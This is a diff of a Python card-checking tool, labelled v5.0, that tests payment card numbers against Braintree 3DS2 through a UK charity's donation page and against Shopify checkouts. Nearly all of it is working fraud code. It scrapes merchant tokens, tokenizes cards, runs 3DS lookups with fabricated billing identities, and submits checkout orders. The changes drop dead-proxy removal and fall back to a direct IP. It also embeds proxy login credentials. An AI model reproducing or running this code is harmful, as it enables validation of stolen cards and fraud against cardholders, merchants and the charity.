@@ -30,7 +30,7 @@ def banner():
    ╚═════╝    ╚═╝       ╚═════╝╚═╝  ╚═╝
 """
     for l in art.strip("\n").split("\n"): print(grad(l))
-    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v4.5{C.R}{C.D}  |  W2 + Auto-Retry{C.R}\n")
+    print(f"  {C.D}Shopify + Braintree 3DS2  |  {C.B}{C.GOLD}v5.0{C.R}{C.D}  |  W2 + Proxy Fallback{C.R}\n")
 
 # ---------- Config ----------
 BATCH_MAX      = 1000
@@ -42,9 +42,7 @@ os.makedirs(RESULT_DIR, exist_ok=True)
 
 TG_W           = 2
 
-PROXY_FAIL_LIMIT = 10
-PROXY_FAIL_COUNT = {}
-
+# မင်းရဲ့ Proxy တွေ
 RAW_PROXIES=[
     "46.225.138.35:36759:l1lo6k6xsj:OetadXmeuu",
     "172.93.105.208:43159:8u74d0ud33:nfRkcoqOel",
@@ -73,7 +71,7 @@ def _tp(url):
 def validate_proxies():
     global WORKING
     if not RAW_PROXIES:
-        print(f"{C.YEL}⚠ Warning: No proxies defined! Bot will stop.{C.R}\n")
+        print(f"{C.YEL}⚠ Warning: No proxies defined! Using Codespace IP.{C.R}\n")
         return
     print(f"{C.CYN}{C.B}◆ Proxy Validation{C.R}  {C.D}({len(RAW_PROXIES)} proxies){C.R}\n")
     tot=len(RAW_PROXIES); w=[]; done=0; lk=threading.Lock()
@@ -113,16 +111,6 @@ def get_proxy():
         x=WORKING[_PI%len(WORKING)]; _PI+=1
     return {"http":x["url"],"https":x["url"]}
 
-def remove_dead_proxy(px):
-    global WORKING, PROXY_FAIL_COUNT
-    if not px: return
-    with _PLK:
-        purl = px.get("http")
-        PROXY_FAIL_COUNT[purl] = PROXY_FAIL_COUNT.get(purl, 0) + 1
-        if PROXY_FAIL_COUNT[purl] >= PROXY_FAIL_LIMIT:
-            WORKING = [w for w in WORKING if w["url"] != purl]
-            print(f" {C.RED}✗ Proxy removed (10 fails): {purl.split('@')[-1]}{C.R}")
-
 # ---------- BIN ----------
 _bc={}; _bl=threading.Lock()
 def bin_lookup(b):
@@ -160,7 +148,7 @@ def bin_line(cc):
 
 def bin_dict(cc): return bin_lookup(cc[:6] if cc else "") or {}
 
-# ---------- Braintree ----------
+# ---------- Braintree (Fallback to Direct IP) ----------
 SM={"authenticate_successful":"Passed","authenticate_attempt_successful":"Passed",
     "challenge_required":"OTP Required","authenticate_frictionless_failed":"OTP Required",
     "lookup_card_error":"Error","authenticate_rejected":"Declined","lookup_error":"Error",
@@ -168,83 +156,78 @@ SM={"authenticate_successful":"Passed","authenticate_attempt_successful":"Passed
 
 def bt_check(cc,mes,ano,cvv):
     st=time.time()
-    current_proxy = get_proxy()
-    if not current_proxy:
-        return False, "No Proxy Available", "Braintree 3DS2", "0.00", "USD"
+    proxies_to_try = [get_proxy(), None] 
     
-    s=requests.Session()
-    s.headers.update({"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-                      "Accept-Language":"en-GB,en;q=0.9","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"})
-    s.cookies.set("cookie_test","please_accept_for_session"); s.cookies.set("civicAllowCookies","yes")
-    
-    auth=merch=None
-    for _ in range(3):
+    for current_proxy in proxies_to_try:
+        s=requests.Session()
+        s.headers.update({"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                          "Accept-Language":"en-GB,en;q=0.9","User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0"})
+        s.cookies.set("cookie_test","please_accept_for_session"); s.cookies.set("civicAllowCookies","yes")
+        
+        auth=merch=None
+        for _ in range(3):
+            try:
+                r=s.get("https://cllsupport.org.uk/donate/",timeout=15,proxies=current_proxy)
+                m=re.search(r'name="clientToken"\s+value="([^"]+)"',r.text) or re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]',r.text)
+                if not m:
+                    a=re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"',r.text)
+                    mm=re.search(r'"merchantId"\s*:\s*"([^"]+)"',r.text)
+                    if a: auth=a.group(1); merch=mm.group(1) if mm else "dyb5fmjx5t5wxckj"; break
+                if m:
+                    d=json.loads(base64.b64decode(m.group(1)).decode())
+                    auth=d.get("authorizationFingerprint",""); merch=d.get("merchantId","")
+                    if auth and merch: break
+            except: pass
+            time.sleep(1)
+            
+        if not auth: continue
+            
+        tok = None
         try:
-            r=s.get("https://cllsupport.org.uk/donate/",timeout=15,proxies=current_proxy)
-            m=re.search(r'name="clientToken"\s+value="([^"]+)"',r.text) or re.search(r'var\s+wc_braintree_client_token\s*=\s*\["(.*?)"\]',r.text)
-            if not m:
-                a=re.search(r'"authorizationFingerprint"\s*:\s*"([^"]+)"',r.text)
-                mm=re.search(r'"merchantId"\s*:\s*"([^"]+)"',r.text)
-                if a: auth=a.group(1); merch=mm.group(1) if mm else "dyb5fmjx5t5wxckj"; break
-            if m:
-                d=json.loads(base64.b64decode(m.group(1)).decode())
-                auth=d.get("authorizationFingerprint",""); merch=d.get("merchantId","")
-                if auth and merch: break
-        except: pass
-        time.sleep(1)
-        
-    if not auth: 
-        remove_dead_proxy(current_proxy)
-        return False, "Lookup Error", "Braintree 3DS2", "0.00", "USD"
-        
-    tok = None
-    try:
-        q="mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
-        h={"Authorization":f"Bearer {auth}","Braintree-Version":"2018-05-10","Content-Type":"application/json"}
-        body={"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"00000000-0000-0000-0000-000000000000"},
-              "query":q,"variables":{"input":{"creditCard":{"number":cc,"expirationMonth":mes,"expirationYear":ano,"cvv":cvv},"options":{"validate":False}}},"operationName":"TokenizeCreditCard"}
-        r=s.post("https://payments.braintree-api.com/graphql",headers=h,json=body,timeout=15,proxies=current_proxy)
-        d=r.json()
-        if "errors" in d or not d.get("data",{}).get("tokenizeCreditCard"): 
-            return False, "Token Failed", "Braintree 3DS2", "0.00", "USD"
-        tok=d["data"]["tokenizeCreditCard"]["token"]
-    except Exception: 
-        remove_dead_proxy(current_proxy)
-        return False, "Lookup Error", "Braintree 3DS2", "0.00", "USD"
-        
-    try:
-        url=f"https://api.braintreegateway.com/merchants/{merch}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
-        pl={"amount":"1.00","browserColorDepth":24,"browserJavaEnabled":False,"browserJavascriptEnabled":True,
-            "browserLanguage":"en-GB","browserScreenHeight":800,"browserScreenWidth":360,"browserTimeZone":-345,
-            "deviceChannel":"Browser","additionalInfo":{"ipAddress":"8.8.8.8","billingLine1":"New York",
-            "billingCity":"New York","billingState":"NY","billingPostalCode":"10080","billingCountryCode":"US",
-            "billingPhoneNumber":"998773772","billingGivenName":"diwas","billingSurname":"Py","email":"diwasPy@gmail.com"},
-            "bin":cc[:6],"dfReferenceId":f"0_{random.randint(1000,9999)}-0000-0000-0000-000000000000",
-            "clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.115.1",
-            "cardinalDeviceDataCollectionTimeElapsed":random.randint(400,2000),
-            "issuerDeviceDataCollectionTimeElapsed":random.randint(800,5000),"issuerDeviceDataCollectionResult":True},
-            "authorizationFingerprint":auth,"braintreeLibraryVersion":"braintree/web/3.115.1",
-            "_meta":{"merchantAppId":"cllsupport.org.uk","platform":"web","sdkVersion":"3.115.1",
-            "source":"client","integration":"custom","integrationType":"custom","sessionId":"00000000-0000-0000-0000-000000000000"}}
-        r=s.post(url,headers={"Content-Type":"application/json"},json=pl,timeout=20,proxies=current_proxy)
-        lk=r.json() if r.status_code in (200,201) else {}
-        
-        cd="no_response"; en="UNKNOWN"
+            q="mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 } } }"
+            h={"Authorization":f"Bearer {auth}","Braintree-Version":"2018-05-10","Content-Type":"application/json"}
+            body={"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"00000000-0000-0000-0000-000000000000"},
+                  "query":q,"variables":{"input":{"creditCard":{"number":cc,"expirationMonth":mes,"expirationYear":ano,"cvv":cvv},"options":{"validate":False}}},"operationName":"TokenizeCreditCard"}
+            r=s.post("https://payments.braintree-api.com/graphql",headers=h,json=body,timeout=15,proxies=current_proxy)
+            d=r.json()
+            if "errors" in d or not d.get("data",{}).get("tokenizeCreditCard"): continue
+            tok=d["data"]["tokenizeCreditCard"]["token"]
+        except Exception: continue
+            
         try:
-            cd=lk["paymentMethod"]["threeDSecureInfo"]["status"]
-            er=lk["paymentMethod"]["threeDSecureInfo"].get("enrolled")
-            en={"Y":"ENROLLED","N":"NOT_ENROLLED","U":"UNKNOWN"}.get(er,"UNKNOWN")
-        except:
-            ss=json.dumps(lk)
-            for c in SM:
-                if c in ss: cd=c; break
-        stt=SM.get(cd,"Unknown"); el=round(time.time()-st,2)
-        return (stt=="Passed"),f"{stt} | {en} | {cd} ({el}s)","Braintree 3DS2","1.00","USD"
-    except Exception: 
-        remove_dead_proxy(current_proxy)
-        return False, "Lookup Error", "Braintree 3DS2", "0.00", "USD"
+            url=f"https://api.braintreegateway.com/merchants/{merch}/client_api/v1/payment_methods/{tok}/three_d_secure/lookup"
+            pl={"amount":"1.00","browserColorDepth":24,"browserJavaEnabled":False,"browserJavascriptEnabled":True,
+                "browserLanguage":"en-GB","browserScreenHeight":800,"browserScreenWidth":360,"browserTimeZone":-345,
+                "deviceChannel":"Browser","additionalInfo":{"ipAddress":"8.8.8.8","billingLine1":"New York",
+                "billingCity":"New York","billingState":"NY","billingPostalCode":"10080","billingCountryCode":"US",
+                "billingPhoneNumber":"998773772","billingGivenName":"diwas","billingSurname":"Py","email":"diwasPy@gmail.com"},
+                "bin":cc[:6],"dfReferenceId":f"0_{random.randint(1000,9999)}-0000-0000-0000-000000000000",
+                "clientMetadata":{"requestedThreeDSecureVersion":"2","sdkVersion":"web/3.115.1",
+                "cardinalDeviceDataCollectionTimeElapsed":random.randint(400,2000),
+                "issuerDeviceDataCollectionTimeElapsed":random.randint(800,5000),"issuerDeviceDataCollectionResult":True},
+                "authorizationFingerprint":auth,"braintreeLibraryVersion":"braintree/web/3.115.1",
+                "_meta":{"merchantAppId":"cllsupport.org.uk","platform":"web","sdkVersion":"3.115.1",
+                "source":"client","integration":"custom","integrationType":"custom","sessionId":"00000000-0000-0000-0000-000000000000"}}
+            r=s.post(url,headers={"Content-Type":"application/json"},json=pl,timeout=20,proxies=current_proxy)
+            lk=r.json() if r.status_code in (200,201) else {}
+            
+            cd="no_response"; en="UNKNOWN"
+            try:
+                cd=lk["paymentMethod"]["threeDSecureInfo"]["status"]
+                er=lk["paymentMethod"]["threeDSecureInfo"].get("enrolled")
+                en={"Y":"ENROLLED","N":"NOT_ENROLLED","U":"UNKNOWN"}.get(er,"UNKNOWN")
+            except:
+                ss=json.dumps(lk)
+                for c in SM:
+                    if c in ss: cd=c; break
+            stt=SM.get(cd,"Unknown"); el=round(time.time()-st,2)
+            return (stt=="Passed"),f"{stt} | {en} | {cd} ({el}s)","Braintree 3DS2","1.00","USD"
+        except Exception: pass
+            
+    time.sleep(3)
+    return False,"Lookup Error","Braintree 3DS2","0.00","USD"
 
-# ---------- Shopify ----------
+# ---------- Shopify (Fallback to Direct IP) ----------
 BK={"US":("123 Main","NY","10080","NY","US","2194157586"),
     "CA":("88 Queen","Toronto","M5J2J3","ON","CA","4165550198"),
     "GB":("221B Baker Street","London","NW1 6XE","LND","GB","2079460123"),
@@ -300,219 +283,218 @@ async def process_card(cc,mes,ano,cvv,site,vid=None):
     gw="UNKNOWN"; tp="0.00"; cur="USD"
     ourl=site if site.startswith('http') else f'https://{site}'
     
-    px=get_proxy()
-    if not px:
-        return False, "No Proxy Available", gw, tp, cur
-    pxs=px.get("http")
+    proxies_to_try = [get_proxy(), None]
     
-    pid=cpd=None; rt="0.00"
-    direct='/cart/' in ourl or '/checkouts/' in ourl
-    try:
-        H={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36',
-           'Accept':'application/json, text/plain, */*','Accept-Language':'en-US,en;q=0.9',
-           'Content-Type':'application/json','Origin':ourl,'Referer':ourl}
-        a=pick_addr(ourl); st,ct,zc,zn,cc_c,ph=a
-        fn,ln=gname(); em=gmail(fn,ln); a2=""
-        conn=aiohttp.TCPConnector(ssl=False); to=aiohttp.ClientTimeout(total=30)
-        async with aiohttp.ClientSession(connector=conn,timeout=to) as s:
-            ckh={**H,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                 'sec-fetch-dest':'document','sec-fetch-mode':'navigate','sec-fetch-site':'same-origin','sec-fetch-user':'?1'}
-            if direct:
-                resp=await s.get(url=ourl,allow_redirects=True,headers=ckh,proxy=pxs)
-            else:
-                cart=ourl+'/cart/add.js'; chk=ourl+'/checkout/'
-                ch={**H,'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json, text/javascript'}
-                cr=await s.post(cart,data=f'id={vid}&quantity=1',headers=ch,proxy=pxs)
-                if cr.status!=200:
-                    cr=await s.post(cart,json={'items':[{'id':int(vid),'quantity':1}]},headers={**H,'Content-Type':'application/json'},proxy=pxs)
-                if cr.status!=200: return False,f"Cart {cr.status}",gw,tp,cur
-                resp=await s.post(url=chk,allow_redirects=True,headers=ckh,proxy=pxs)
-            curl=str(resp.url); m=re.search(r'/checkouts/cn/([^/?]+)',curl)
-            atk=m.group(1) if m else curl.split('/')[-1].split('?')[0]
-            sst=resp.headers.get('X-Checkout-One-Session-Token') or resp.headers.get('x-checkout-one-session-token')
-            txt=await resp.text()
-            if direct and not vid:
-                mvid=re.search(r'gid://shopify/ProductVariant/(\d+)',txt.replace('&quot;','"'))
-                vid=mvid.group(1) if mvid else "1"
-            if not sst:
-                for a1,b1 in [('name="serialized-sessionToken" content="&quot;','&quot;'),
-                              ('name="serialized-sessionToken" content="','"'),
-                              ('"serializedSessionToken":"','"'),('data-session-token="','"'),
-                              ('"sessionToken":"','"')]:
-                    sst=eb(txt,a1,b1)
-                    if sst: break
-            if 'login' in curl.lower(): return False,"Login required",gw,tp,cur
-            qt=eb(txt,'queueToken&quot;:&quot;','&quot;') or eb(txt,'"queueToken":"','"')
-            sid=eb(txt,'stableId&quot;:&quot;','&quot;') or eb(txt,'"stableId":"','"')
-            mch=eb(txt,'ProductVariantMerchandise/','&quot;') or eb(txt,'"merchandiseId":"gid://shopify/ProductVariantMerchandise/','"') or str(vid)
-            if 'currencyCode&quot;:&quot;' in txt: cur=eb(txt,'currencyCode&quot;:&quot;','&quot;') or 'USD'
-            elif '"currencyCode":"' in txt: cur=eb(txt,'"currencyCode":"','"') or 'USD'
-            sub=eb(txt,'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;','&quot;') or eb(txt,'"subtotalBeforeTaxesAndShipping":{"value":{"amount":"','"')
-            if not sub:
-                pm=re.search(r'"price":\s*"([\d.]+)"',txt); sub=pm.group(1) if pm else "0.01"
-            ue=txt.replace('&quot;','"').replace('&amp;','&')
-            bid=None; bm=re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"',ue)
-            if bm: bid=bm.group(1)
-            stok=eb(txt,'name="serialized-sourceToken" content="','"')
-            if stok: stok=stok.replace('&quot;','').strip('"')
-            isig=None; im=re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',ue)
-            if im: isig=im.group(1)
-            if not sst: 
-                remove_dead_proxy(px)
-                return False,"No session token",gw,tp,cur
-            H.update({'shopify-checkout-client':'checkout-web/1.0','shopify-checkout-source':f'id="{atk}", type="cn"',
-                      'x-checkout-one-session-token':sst,'sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin'})
-            if bid: H['x-checkout-web-build-id']=bid; H['x-checkout-web-deploy-stage']='production'; H['x-checkout-web-server-handling']='fast'; H['x-checkout-web-server-rendering']='yes'
-            if stok: H['x-checkout-web-source-id']=stok
-            params={'operationName':'Proposal'}
-            jd={'query':QUERY_PROPOSAL_SHIPPING,'variables':{
-                'sessionInput':{'sessionToken':sst},'queueToken':qt or '','discounts':{'lines':[],'acceptUnexpectedDiscounts':True},
-                'delivery':{'deliveryLines':[{'destination':{'partialStreetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}},'selectedDeliveryStrategy':{'deliveryStrategyMatchingConditions':{'estimatedTimeInTransit':{'any':True},'shipments':{'any':True}},'options':{}},'targetMerchandiseLines':{'any':True},'deliveryMethodTypes':['SHIPPING'],'expectedTotalPrice':{'any':True},'destinationChanged':True}],'noDeliveryRequired':[],'useProgressiveRates':False,'prefetchShippingRatesStrategy':None,'supportsSplitShipping':True},
-                'deliveryExpectations':{'deliveryExpectationLines':[]},
-                'merchandise':{'merchandiseLines':[{'stableId':sid or '1','merchandise':{'productVariantReference':{'id':f'gid://shopify/ProductVariantMerchandise/{mch}','variantId':f'gid://shopify/ProductVariant/{vid}','properties':[],'sellingPlanId':None,'sellingPlanDigest':None}},'quantity':{'items':{'value':1}},'expectedTotalPrice':{'value':{'amount':sub,'currencyCode':cur}},'lineComponentsSource':None,'lineComponents':[]}]},
-                'payment':{'totalAmount':{'any':True},'paymentLines':[],'billingAddress':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}}},
-                'buyerIdentity':{'customer':{'presentmentCurrency':cur,'countryCode':cc_c},'email':em,'emailChanged':False,'phoneCountryCode':cc_c,'marketingConsent':[{'email':{'value':em}}],'shopPayOptInPhone':{'countryCode':cc_c},'rememberMe':False},
-                'tip':{'tipLines':[]},'taxes':{'proposedAllocations':None,'proposedTotalAmount':{'value':{'amount':'0','currencyCode':cur}},'proposedTotalIncludedAmount':None,'proposedMixedStateTotalAmount':None,'proposedExemptions':[]},
-                'note':{'message':None,'customAttributes':[]},'localizationExtension':{'fields':[]},'nonNegotiableTerms':None,
-                'scriptFingerprint':{'signature':None,'signatureUuid':None,'lineItemScriptChanges':[],'paymentScriptChanges':[],'shippingScriptChanges':[]},'optionalDuties':{'buyerRefusesDuties':False}},'operationName':'Proposal'}
-            gq=f'https://{urlparse(ourl).netloc}/checkouts/unstable/graphql'
-            for i in range(2):
-                resp,rt_=await gql(s,gq,params,H,jd,px=pxs)
-                if i==0: await asyncio.sleep(3)
-            if not resp: 
-                remove_dead_proxy(px)
-                return False,"Req failed",gw,tp,cur
-            if is_cap(rt_): return False,"CAPTCHA_REQUIRED",gw,tp,cur
-            try: rj=json.loads(rt_)
-            except: return False,"Bad JSON",gw,tp,cur
-            if 'errors' in rj: return False,f"GQL: {'; '.join(e.get('message','') for e in rj['errors'][:2])}",gw,tp,cur
-            try:
-                sess_=rj['data']['session']; neg=sess_['negotiate']; res=neg['result']
-                rty=res.get('__typename','')
-                if rty=='CheckpointDenied': return False,"Checkpoint Denied",gw,tp,cur
-                if rty=='Throttled': return False,"Throttled",gw,tp,cur
-                if rty=='NegotiationResultFailed': return False,"Negotiation failed",gw,tp,cur
-                cpd=res.get('checkpointData'); sel=res['sellerProposal']; dv=sel.get('delivery'); rt=sel['runningTotal']['value']['amount']
-            except (KeyError,TypeError) as e: return False,f"Parse: {e}",gw,tp,cur
-            dst=''; shp=0.0
-            if dv and dv.get('__typename')=='FilledDeliveryTerms':
-                dl=dv.get('deliveryLines',[{}]); av=dl[0].get('availableDeliveryStrategies',[]) if dl else []
-                if av:
-                    dst=av[0].get('handle','')
-                    try: shp=float(av[0].get('amount',{}).get('value',{}).get('amount','0'))
-                    except: shp=0.0
-            try:
-                tx=sel.get('tax',{}); txm=float(tx.get('totalTaxAmount',{}).get('value',{}).get('amount','0')) if tx.get('__typename')=='FilledTaxTerms' else 0.0
-            except: txm=0.0
-            pd=sel.get('payment',{})
-            if pd.get('__typename')=='FilledPaymentTerms':
-                for mt in pd.get('availablePaymentLines',[]):
-                    pmm=mt.get('paymentMethod',{})
-                    if pmm.get('name') or pmm.get('paymentMethodIdentifier'):
-                        pid=pmm.get('paymentMethodIdentifier'); gw=pmm.get('extensibilityDisplayName') or pmm.get('name','UNKNOWN'); tp=str(float(rt)+shp+txm); break
-            if not pid: return False,"No payment method",gw,tp,cur
-            jd['query']=QUERY_PROPOSAL_DELIVERY
-            jd['variables']['delivery']['deliveryLines'][0]['selectedDeliveryStrategy']={'deliveryStrategyByHandle':{'handle':dst or '','customDeliveryRate':False},'options':{}}
-            jd['variables']['delivery']['deliveryLines'][0]['targetMerchandiseLines']={'lines':[{'stableId':sid or '1'}]}
-            jd['variables']['delivery']['deliveryLines'][0]['expectedTotalPrice']={'value':{'amount':str(shp),'currencyCode':cur}}
-            jd['variables']['delivery']['deliveryLines'][0]['destinationChanged']=False
-            jd['variables']['taxes']['proposedTotalAmount']['value']['amount']=str(txm)
-            jd['variables']['buyerIdentity']['shopPayOptInPhone']['number']=ph
-            resp,rt_=await gql(s,gq,params,H,jd,px=pxs)
-            if is_cap(rt_): return False,"CAPTCHA delivery",gw,tp,cur
-            pl={"credit_card":{"number":cc,"month":int(mes),"year":int(ano),"verification_value":cvv,"start_month":None,"start_year":None,"issue_number":"","name":f"{fn} {ln}"},"payment_session_scope":urlparse(ourl).netloc}
-            vh={'Content-Type':'application/json','Accept':'application/json','Accept-Language':'en-US,en;q=0.9','Origin':'https://checkout.pci.shopifyinc.com','Referer':'https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36'}
-            if isig: vh['shopify-identification-signature']=isig
-            resp=await s.post('https://checkout.pci.shopifyinc.com/sessions',json=pl,headers=vh,proxy=pxs)
-            try:
-                td=await resp.json(); tok=td.get('id')
-                if not tok: 
-                    remove_dead_proxy(px)
-                    return False,"No payment token",gw,tp,cur
-            except Exception as e: 
-                remove_dead_proxy(px)
-                return False,f"Token: {e}",gw,tp,cur
-            
-            params={'operationName':'SubmitForCompletion'}
-            sv={'input':{
-                'sessionInput':{'sessionToken':sst},'queueToken':qt or '','discounts':{'lines':[],'acceptUnexpectedDiscounts':True},
-                'delivery':{'deliveryLines':[{'destination':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}},'selectedDeliveryStrategy':{'deliveryStrategyByHandle':{'handle':dst or '','customDeliveryRate':False},'options':{'phone':ph}},'targetMerchandiseLines':{'lines':[{'stableId':sid or '1'}]},'deliveryMethodTypes':['SHIPPING'],'expectedTotalPrice':{'value':{'amount':str(shp),'currencyCode':cur}},'destinationChanged':False}],'noDeliveryRequired':[],'useProgressiveRates':True,'prefetchShippingRatesStrategy':None,'supportsSplitShipping':True},
-                'merchandise':{'merchandiseLines':[{'stableId':sid or '1','merchandise':{'productVariantReference':{'id':f'gid://shopify/ProductVariantMerchandise/{mch}','variantId':f'gid://shopify/ProductVariant/{vid}','properties':[],'sellingPlanId':None,'sellingPlanDigest':None}},'quantity':{'items':{'value':1}},'expectedTotalPrice':{'value':{'amount':sub,'currencyCode':cur}},'lineComponentsSource':None,'lineComponents':[]}]},
-                'payment':{'totalAmount':{'any':True},'paymentLines':[{'paymentMethod':{'directPaymentMethod':{'paymentMethodIdentifier':pid,'sessionId':tok,'billingAddress':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}},'cardSource':None}},'amount':{'value':{'amount':rt,'currencyCode':cur}},'dueAt':None}],'billingAddress':{'streetAddress':{'address1':st,'address2':a2,'city':ct,'countryCode':cc_c,'postalCode':zc,'firstName':fn,'lastName':ln,'zoneCode':zn,'phone':ph}}},
-                'buyerIdentity':{'customer':{'presentmentCurrency':cur,'countryCode':cc_c},'email':em,'emailChanged':False,'phoneCountryCode':cc_c,'marketingConsent':[{'email':{'value':em}}],'shopPayOptInPhone':{'number':ph,'countryCode':cc_c},'rememberMe':False},
-                'taxes':{'proposedAllocations':None,'proposedTotalAmount':{'value':{'amount':str(txm),'currencyCode':cur}},'proposedTotalIncludedAmount':None,'proposedMixedStateTotalAmount':None,'proposedExemptions':[]},
-                'tip':{'tipLines':[]},'note':{'message':None,'customAttributes':[]},'localizationExtension':{'fields':[]},'nonNegotiableTerms':None,'optionalDuties':{'buyerRefusesDuties':False}},'attemptToken':atk,'metafields':[],'analytics':{'requestUrl':curl}}
-            if cpd: sv['input']['checkpointData']=cpd
-            sj={'query':MUTATION_SUBMIT,'variables':sv,'operationName':'SubmitForCompletion'}
-            resp,txt=await gql(s,gq,params,H,sj,px=pxs)
-            if is_cap(txt): return False,"CAPTCHA submit",gw,tp,cur
-            if "Your order total has changed." in txt: return False,"Site not supported",gw,tp,cur
-            if "The requested payment method is not available." in txt: return False,"Payment not available",gw,tp,cur
-            
-            try:
-                rj=json.loads(txt); sd=rj.get('data',{}).get('submitForCompletion',{})
-                if not sd:
-                    for e in rj.get('errors',[]):
-                        if e.get('code'): return False,e['code'],gw,tp,cur
-                    return False,"Empty submit",gw,tp,cur
-                rty=sd.get('__typename','')
-                if rty in ['SubmitSuccess','SubmittedForCompletion','SubmitAlreadyAccepted']:
-                    rc=sd.get('receipt',{})
-                    if rc:
-                        if rc.get('__typename')=='ProcessedReceipt': return True,"ORDER_PLACED",gw,tp,cur
-                        rid=rc.get('id')
-                    else: return False,"No receipt",gw,tp,cur
-                elif rty=='SubmitFailed': return False,clean_r(sd.get('reason','Unknown')),gw,tp,cur
-                elif rty=='SubmitRejected':
-                    for e in sd.get('errors',[]):
-                        c=e.get('code','')
-                        if c in ('GENERIC_ERROR','PAYMENT_FAILED',''):
-                            d=e.get('localizedMessage') or e.get('nonLocalizedMessage')
-                            if d: return False,d,gw,tp,cur
-                        if c: return False,c,gw,tp,cur
-                    return False,"Submit Rejected",gw,tp,cur
-                elif rty=='Throttled': return False,"Throttled",gw,tp,cur
-                rc=sd.get('receipt',{})
-                if not rc: return False,"No receipt",gw,tp,cur
-                rid=rc.get('id')
-                if not rid: return False,"No receipt ID",gw,tp,cur
-            except: return False,"Bad submit JSON",gw,tp,cur
-            
-            params={'operationName':'PollForReceipt'}
-            pj={'query':QUERY_POLL,'variables':{'receiptId':rid,'sessionToken':sst},'operationName':'PollForReceipt'}
-            await asyncio.sleep(3)
-            ft=""
-            for i in range(4):
-                resp,ft=await gql(s,gq,params,H,pj,px=pxs)
-                if is_cap(ft): return True,"CARD_DECLINED",gw,tp,cur
+    for px in proxies_to_try:
+        pxs=px.get("http") if px else None
+        pid=cpd=None; rt="0.00"
+        direct='/cart/' in ourl or '/checkouts/' in ourl
+        try:
+            H={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/146.0.0.0 Safari/537.36',
+               'Accept':'application/json, text/plain, */*','Accept-Language':'en-US,en;q=0.9',
+               'Content-Type':'application/json','Origin':ourl,'Referer':ourl}
+            a=pick_addr(ourl); st,ct,zc,zn,cc_c,ph=a
+            fn,ln=gname(); em=gmail(fn,ln); a2=""
+            conn=aiohttp.TCPConnector(ssl=False); to=aiohttp.ClientTimeout(total=30)
+            async with aiohttp.ClientSession(connector=conn,timeout=to) as s:
+                ckh={**H,'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                     'sec-fetch-dest':'document','sec-fetch-mode':'navigate','sec-fetch-site':'same-origin','sec-fetch-user':'?1'}
+                if direct:
+                    resp=await s.get(url=ourl,allow_redirects=True,headers=ckh,proxy=pxs)
+                else:
+                    cart=ourl+'/cart/add.js'; chk=ourl+'/checkout/'
+                    ch={**H,'Content-Type':'application/x-www-form-urlencoded','Accept':'application/json, text/javascript'}
+                    cr=await s.post(cart,data=f'id={vid}&quantity=1',headers=ch,proxy=pxs)
+                    if cr.status!=200:
+                        cr=await s.post(cart,json={'items':[{'id':int(vid),'quantity':1}]},headers={**H,'Content-Type':'application/json'},proxy=pxs)
+                    if cr.status!=200: continue
+                    resp=await s.post(url=chk,allow_redirects=True,headers=ckh,proxy=pxs)
+                curl=str(resp.url); m=re.search(r'/checkouts/cn/([^/?]+)',curl)
+                atk=m.group(1) if m else curl.split('/')[-1].split('?')[0]
+                sst=resp.headers.get('X-Checkout-One-Session-Token') or resp.headers.get('x-checkout-one-session-token')
+                txt=await resp.text()
+                if direct and not vid:
+                    mvid=re.search(r'gid://shopify/ProductVariant/(\d+)',txt.replace('&quot;','"'))
+                    vid=mvid.group(1) if mvid else "1"
+                if not sst:
+                    for a1,b1 in [('name="serialized-sessionToken" content="&quot;','&quot;'),
+                                  ('name="serialized-sessionToken" content="','"'),
+                                  ('"serializedSessionToken":"','"'),('data-session-token="','"'),
+                                  ('"sessionToken":"','"')]:
+                        sst=eb(txt,a1,b1)
+                        if sst: break
+                if 'login' in curl.lower(): continue
+                qt=eb(txt,'queueToken&quot;:&quot;','&quot;') or eb(txt,'"queueToken":"','"')
+                sid=eb(txt,'stableId&quot;:&quot;','&quot;') or eb(txt,'"stableId":"','"')
+                mch=eb(txt,'ProductVariantMerchandise/','&quot;') or eb(txt,'"merchandiseId":"gid://shopify/ProductVariantMerchandise/','"') or str(vid)
